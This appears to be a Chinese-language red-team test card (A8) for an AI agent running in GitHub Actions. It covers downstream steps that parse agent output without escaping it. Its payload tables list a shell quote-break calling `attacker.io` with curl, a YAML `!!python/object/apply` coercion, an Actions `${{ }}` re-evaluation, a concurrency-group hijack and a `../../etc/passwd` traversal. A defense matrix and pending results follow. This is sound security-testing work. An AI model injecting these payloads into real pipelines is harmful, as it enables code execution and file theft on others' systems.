# A8 — Sink 解析破(下游消费 agent 输出的解析漏洞)

## 1. Surface
- 编号:A8 / Sink / 主图 (13)
- 名称:Downstream sink parsing vulnerabilities

## 2. Root cause
下游 sink 把 agent 输出当可信数据,未 escape。是 A7b 的下游对偶。

## 3. Preconditions
存在下游 sink 消费 agent 输出。

## 4. Setup
`.github/workflows/mcp-agent.yml`(含消费 step)+ `.github/workflows/normal-ci.yml`(共享 concurrency)。

## 5. Attacker action(sink 矩阵)

| Sink | Payload 摘要 |
|---|---|
| Shell 单引号边界破 | `'; curl attacker.io; #` |
| `yaml.safe_load` 类型强转 | `!!python/object/apply` 或 `!!binary` |
| GitHub Actions `${{ }}` 二次求值 | agent output 含 `${{ github.event.issue.title }}` |
| `concurrency.group` 队列劫持 | agent 输出的 group 名与正常 job 冲突 |
| `upload-artifact` 文件名越权 | 输出中含 `../../../etc/passwd` 之类路径 |

## 6. Success signal
- [ ] 下游 sink 执行 attacker-controlled 逻辑 / 或队列被劫持 / 或文件写入越权

## 7. Failure signal
- sink 有独立 escape
- Actions 内部对 expression 二次求值的收紧(近年新特性)

## 7. Attack variants matrix(sink 类型)

| Variant | Sink | Payload | 结果 |
|---|---|---|---|
| V1 shell 单引号破 | Bash | `'; curl attacker; #` | ⚪ |
| V2 yaml.safe_load 强转 | Python | `!!python/object/apply` | ⚪ |
| V3 GHA expression re-eval | `${{ }}` | 输出中含 `${{ github.event.issue.title }}` | ⚪ |
| V4 concurrency 劫持 | group | 输出的 group 与正常 job 冲突 | ⚪ |
| V5 upload-artifact 越权 | 文件名 | `../../etc/passwd` | ⚪ |

## 8. Defense matrix

| Defense | 层 | 期望 | 实测 | 备注 |
|---|---|---|---|---|
| **下游 sink 独立 escape** | Code | Block 全部 | ⚪ | 与 A7b 同源 |
| YAML `safe_load` 换 `yaml.SafeLoader` 严格版 | Code | Block V2 | ⚪ | Python 专用 |
| Actions expression 平台加固 | Platform | Block V3 | ⚪ | GitHub 已收紧部分 |
| Artifact 文件名 sanitize | Workflow | Block V5 | ⚪ | 使用 `path` 而非 `name` |
| Concurrency group 强制 prefix | Workflow | Block V4 | ⚪ | — |

## 9. Failure / Blocked signal
- 下游 step 用 env 传参数,不做字符串拼接
- artifact 上传报"invalid file name"

## 10. Result
待复现,每种 sink 各跑一次。
